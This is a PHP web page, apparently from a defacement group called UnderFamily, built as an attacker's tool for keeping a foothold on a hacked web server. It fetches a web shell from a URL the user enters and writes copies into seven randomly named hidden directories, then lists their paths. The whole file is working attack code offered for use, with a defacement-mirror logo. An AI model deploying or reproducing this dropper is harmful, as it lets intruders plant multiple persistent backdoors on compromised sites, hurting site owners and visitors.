<center>
<body bgcolor="black">
<img src="http://zonehmirrors.org/defaced/2019/09/14/www.shellerim.org/www.cardtools.net/logo.png">
<font color="white">
<h1>7 File Creator by UnderFamily.org</h1>
<form action="" method="POST">
<input type="text" name="dir" value="<?php echo @exec("pwd"); ?>">
<br><br>
<input type="text" name="shell" value="http://site.com/x.txt">
<br><br>
<button type="submit" name="file3under_">UNDER!</button>
</form>
<?php
//underfamily.org
if(isset($_POST["file3under_"])) {
$dirr = $_POST["dir"];
$shell = file_get_contents($_POST["shell"]);
 
function sifreUret($uzunluk, $tip=5)
{
 $sifre ="";
 for($i=0;$i<$uzunluk;$i++)
 {

if ($tip==1)
$sifre.=chr(rand(48,57));//0-9


    elseif($tip==2)
$sifre.=chr(rand(65,90));//A-Z


elseif($tip==3)
$sifre.=chr(rand(97,122));//a-z


elseif($tip==4)
$sifre.=chr(rand(33,38));


elseif($tip==5){
$sec=rand(1,4); 
if ($sec==1)     $sifre.=chr(rand(33,38));
elseif ($sec==2) $sifre.=chr(rand(65,90));
elseif ($sec==3) $sifre.=chr(rand(97,122));
elseif ($sec==4) $sifre.=chr(rand(48,57));
}
 
 }
 return $sifre;
}
 
$dir1 = sifreUret(6,3);

$dir2 = sifreUret(6,3);

$dir3 = sifreUret(6,3);

$dir4 = sifreUret(6,3);

$dir5 = sifreUret(6,3);

$dir6 = sifreUret(6,3);

$dir7 = sifreUret(6,3);

$file1 = sifreUret(6,3);

$file2 = sifreUret(6,3);

$file3 = sifreUret(6,3);

$file4 = sifreUret(6,3);

$file5 = sifreUret(6,3);

$file6 = sifreUret(6,3);

$file7 = sifreUret(6,3);

$x = ("".$dirr."/".$dir1."/".$file1.".php");

$q = ("".$dirr."/".$dir2."/".$file2.".php");

$z = ("".$dirr."/".$dir3."/".$file3.".php");

$l = ("".$dirr."/".$dir4."/".$file4.".php");

$m = ("".$dirr."/".$dir5."/".$file5.".php");

$n = ("".$dirr."/".$dir6."/".$file6.".php");

$o = ("".$dirr."/".$dir7."/".$file7.".php");

mkdir($dir1);

mkdir($dir2);

mkdir($dir3);

mkdir($dir4);

mkdir($dir5);

mkdir($dir6);

mkdir($dir7);

chdir("".$dirr."/".$dir1."");

$file1_1 = fopen($x, 'w+');
fwrite($file1_1, $shell);
fclose($file1_1);

chdir("".$dirr."/".$dir2."");

$file2_2 = fopen($q, 'w+');
fwrite($file2_2, $shell);
fclose($file2_2);

chdir("".$dirr."/".$dir3."");

$file3_3 = fopen($z, 'w+');
fwrite($file3_3, $shell);
fclose($file3_3);

chdir("".$dirr."/".$dir4."");

$file4_4 = fopen($l, 'w+');
fwrite($file4_4, $shell);
fclose($file4_4);

chdir("".$dirr."/".$dir5."");

$file5_5 = fopen($m, 'w+');
fwrite($file5_5, $shell);
fclose($file5_5);

chdir("".$dirr."/".$dir6."");

$file6_6 = fopen($n, 'w+');
fwrite($file6_6, $shell);
fclose($file6_6);

chdir("".$dirr."/".$dir7."");

$file7_7 = fopen($o, 'w+');
fwrite($file7_7, $shell);
fclose($file7_7);

echo '
<br><br>
File 1 : '.$dirr.'/'.$dir1.'/'.$file1.'.php
<br>
File 2 : '.$dirr.'/'.$dir2.'/'.$file3.'.php
<br>
File 3 : '.$dirr.'/'.$dir3.'/'.$file3.'.php
<br>
File 4 : '.$dirr.'/'.$dir4.'/'.$file4.'.php
<br>
File 5 : '.$dirr.'/'.$dir5.'/'.$file5.'.php
<br>
File 6 : '.$dirr.'/'.$dir6.'/'.$file6.'.php
<br>
File 7 : '.$dirr.'/'.$dir7.'/'.$file7.'.php
<br></font>';
}
?>
